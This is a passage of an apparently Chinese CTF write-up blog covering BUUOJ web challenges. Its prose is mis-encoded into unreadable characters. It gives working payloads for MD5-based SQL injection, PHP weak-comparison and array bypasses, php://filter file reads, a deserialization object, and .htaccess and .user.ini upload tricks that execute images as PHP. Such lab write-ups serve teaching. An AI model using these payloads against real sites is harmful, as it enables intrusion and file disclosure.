<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220713111008888.png" alt="image-20220713111008888"></p>
<p>æŒ‰ç†è¯´å†ç™»å½•çš„æ—¶å€™ï¼Œåº”è¯¥å…ˆæŸ¥æœ‰æ²¡æœ‰è¯¥ç”¨æˆ·çš„ï¼Œç™»å½•ä¹‹åå†è¿›è¡Œ<code>session[&#39;name&#39;]</code>çš„èµ‹å€¼è¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†å…ˆèµ‹å€¼<code>session[&#39;name&#39;]</code>çš„æ¼æ´ã€‚</p>

        <h1 id="åä¹ã€-BJDCTF2020-Easy-MD5"   >
          <a href="#åä¹ã€-BJDCTF2020-Easy-MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¹ã€-BJDCTF2020-Easy-MD5" class="headerlink" title="åä¹ã€[BJDCTF2020]Easy MD5"></a>åä¹ã€[BJDCTF2020]Easy MD5</h1>
      <p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12535534.html" >BUUOJè®°å½•] [BJDCTF2020]Easy MD5 - Yeâ€™sBlog - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ğŸ”ºMD5-SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡"   >
          <a href="#ğŸ”ºMD5-SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºMD5-SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡" class="headerlink" title="ğŸ”ºMD5+SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡"></a>ğŸ”ºMD5+SQLã€PHPå¼±æ¯”è¾ƒã€æ•°ç»„ç»•è¿‡</h2>
      
        <h2 id="1-MD5å®ç°SQLæ³¨å…¥"   >
          <a href="#1-MD5å®ç°SQLæ³¨å…¥" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-MD5å®ç°SQLæ³¨å…¥" class="headerlink" title="1.MD5å®ç°SQLæ³¨å…¥"></a>1.MD5å®ç°SQLæ³¨å…¥</h2>
      <p>ç¬¬ä¸€å…³çš„çš„<code>http</code>å¤´éƒ¨æœ‰<code>hint</code></p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></div></figure>

<p>å‚æ•°ä¸º<code>true</code>ä»£è¡¨è¿”å›åŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äº<code>SQL</code>è¯­å¥è¢«<code>md5</code>ä¹‹åçš„å­—ç¬¦ç›´æ¥æ§åˆ¶ï¼Œé‚£ä¹ˆå°è¯•æ„é€ å¦‚ä¸‹</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;xxx&#x27;</span> </span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±èƒ½ç»•è¿‡äº†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²<code>str</code>ï¼Œå…¶<code>md5(str)=&#39;or&#39;xxx </code>ï¼Œè€Œ<code>&#39;or&#39; </code>å¯¹åº”çš„16è¿›åˆ¶ä¸º<code>0x276f7227</code>ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²<code>ffifdyop</code>çš„<code>md5</code>å°±æ»¡è¶³è¿™ä¸ªæ¡ä»¶(ä¸çŸ¥é“è¿™ä¹ˆæ¥çš„)ã€‚</p>
<p>PSï¼šé‚£å¦‚æœä»¥åæƒ³æ‰¾ä¸ä¸€æ ·çš„çš„ï¼Œæ˜¯å¦éœ€è¦ç”¨åˆ°<code>md5</code>ç¢°æ’ï¼Ÿ</p>

        <h2 id="2-PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ"   >
          <a href="#2-PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="2.PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ"></a>2.PHPç»“åˆMD5å¼±ç±»å‹æ¯”è¾ƒ</h2>
      <p>æŸ¥çœ‹æºç ï¼Œæ³¨é‡Šéƒ¨åˆ†æœ‰æç¤º</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œæ‰¾ä¸€ä¸‹<code>0exx</code>è¿™ä¸ªç§‘å­¦è®¡æ•°æ³•ï¼Œä»£è¡¨0çš„xxæ¬¡æ–¹ï¼Œè¿˜æ˜¯0ã€‚<code>QNKCDZO</code>å’Œ<code>s214587387a</code></p>

        <h2 id="3-æ•°ç»„ç»•è¿‡"   >
          <a href="#3-æ•°ç»„ç»•è¿‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ•°ç»„ç»•è¿‡" class="headerlink" title="3.æ•°ç»„ç»•è¿‡"></a>3.æ•°ç»„ç»•è¿‡</h2>
      <p>æœ‰æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>

<p>åˆ©ç”¨<code>PHP</code>çš„<code>md5</code>è®¡ç®—ç‰¹æ€§</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(array()) = null</span><br><span class="line">sha1(array()) = null    </span><br><span class="line">ereg(pattern,array()) = null vs preg_match(pattern,array) = false</span><br><span class="line">strcmp(array(), &quot;abc&quot;) = null</span><br><span class="line">strpos(array(),&quot;abc&quot;) = null</span><br></pre></td></tr></table></div></figure>

<p><code>POST</code>ä¼ å…¥<code>param1[]=1&amp;param2[]=2</code>å³å¯å¾—åˆ°Flag</p>

        <h1 id="äºŒåã€-ZJCTF-2019-NiZhuanSiWei"   >
          <a href="#äºŒåã€-ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåã€-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="äºŒåã€[ZJCTF 2019]NiZhuanSiWei"></a>äºŒåã€[ZJCTF 2019]NiZhuanSiWei</h1>
      
        <h2 id="ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–"   >
          <a href="#ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–" class="headerlink" title="ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–"></a>ğŸ”ºä¼ªåè®®ã€ååºåˆ—åŒ–</h2>
      <p>ç»™äº†æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦è®¾ç½®<code>text</code>ï¼Œä½†æ˜¯ç”¨çš„æ˜¯<code>file_get_contents</code>ï¼Œè¿™ä¸ªéœ€è¦ä¸ºæ–‡ä»¶æµï¼Œå¯ä»¥ä½¿ç”¨<code>data</code>ä¼ªåè®®ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></div></figure>

<p>ç„¶å<code>file</code>æç¤ºåŒ…å«è¿›<code>useless.php</code>ï¼Œä½¿ç”¨<code>php://filter/</code>ä¼ªåè®®è¿›è¡Œè¯»å–</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></div></figure>

<p><code>base64</code>è§£ç åè·å–åˆ°æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä¼šè¾“å‡º<code>file</code>æˆå‘˜æŒ‡å‘çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä¿®æ”¹<code>file</code>ä¸º<code>flag.php</code>ï¼Œè¿›è¡Œåºåˆ—åŒ–ï¼Œå¾—åˆ°</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç»“åˆæ‰€æœ‰çš„ï¼Œæœ€åååºåˆ—åŒ–<code>password</code>å¾—åˆ°æœ€ç»ˆçš„<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>åœ¨æºç æ³¨é‡Šä¸­çœ‹åˆ°<code>flag</code></p>

        <h1 id="äºŒåä¸€ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"   >
          <a href="#äºŒåä¸€ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåä¸€ã€-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="äºŒåä¸€ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>äºŒåä¸€ã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1>
      
        <h2 id="ğŸ”º-htaccessåˆ©ç”¨"   >
          <a href="#ğŸ”º-htaccessåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”º-htaccessåˆ©ç”¨" class="headerlink" title="ğŸ”º.htaccessåˆ©ç”¨"></a>ğŸ”º<code>.htaccess</code>åˆ©ç”¨</h2>
      <p>ä¼ å…¥<code>.htaccess</code>å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿å¾—<code>php</code>å¯ä»¥è§£æ<code>test.png</code>ä¸º<code>php</code>ï¼Œä»è€Œæ‰§è¡Œã€‚ä¸è¿‡<code>.htaccess</code>åªèƒ½åœ¨<code>apache</code>æœåŠ¡ä¸­èµ·ä½œç”¨</p>

        <h1 id="äºŒåäºŒã€-SUCTF-2019-CheckIn"   >
          <a href="#äºŒåäºŒã€-SUCTF-2019-CheckIn" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåäºŒã€-SUCTF-2019-CheckIn" class="headerlink" title="äºŒåäºŒã€[SUCTF 2019]CheckIn"></a>äºŒåäºŒã€[SUCTF 2019]CheckIn</h1>
      
        <h2 id="ğŸ”º-user-iniåˆ©ç”¨"   >
          <a href="#ğŸ”º-user-iniåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”º-user-iniåˆ©ç”¨" class="headerlink" title="ğŸ”º.user.iniåˆ©ç”¨"></a>ğŸ”º<code>.user.ini</code>åˆ©ç”¨</h2>
      <p>ä¼ å…¥<code>.user.ini</code>å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=origin.png</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/287193.html" >æµ…æ.htaccesså’Œ.user.iniæ–‡ä»¶ä¸Šä¼  - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>auto_prepend_file</code>è¡¨ç¤º<code>.user.ini</code>å­˜åœ¨çš„å½“å‰ç›®å½•ä¸‹æ‰§è¡Œ<code>php</code>ä»£ç ä¹‹å‰ï¼Œé¢„å…ˆæ–‡ä»¶åŒ…å«è¿›<code>origin.png</code>ï¼Œä»è€Œèƒ½å¤Ÿè¿›è¡Œä½œä¸º<code>php</code>ä»£ç è§£æ</p>

        <h1 id="äºŒåä¸‰ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"   >
          <a href="#äºŒåä¸‰ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒåä¸‰ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="äºŒåä¸‰ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>äºŒåä¸‰ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1>
      
        <h2 id="ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ"   >
          <a href="#ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ" class="headerlink" title="ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ"></a>ğŸ”ºphpååºåˆ—åŒ–çš„å±æ€§ä¸æ•æ„Ÿ</h2>
      <p>æ‰“å¼€å¾—åˆ°æºç </p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>GET</code>ä¼ å…¥çš„<code>str</code>ä¸­æ¯ä¸€ä¸ªå­—ç¬¦éƒ½éœ€è¦åœ¨<code>%32~%125</code>ï¼Œå±äºå¯è§å­—ç¬¦ä¸­</li>
<li>å½“<code>op</code>ä¸º<code>&quot;2&quot;</code>æ˜¯ï¼Œæ‰“å°å‡º<code>filename</code></li>
<li><code>filename</code>éœ€è¦ä¸º<code>flag.php</code></li>
</ul>

        <h2 id="æ¡ä»¶ä¸€"   >
          <a href="#æ¡ä»¶ä¸€" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¡ä»¶ä¸€" class="headerlink" title="æ¡ä»¶ä¸€"></a>æ¡ä»¶ä¸€</h2>
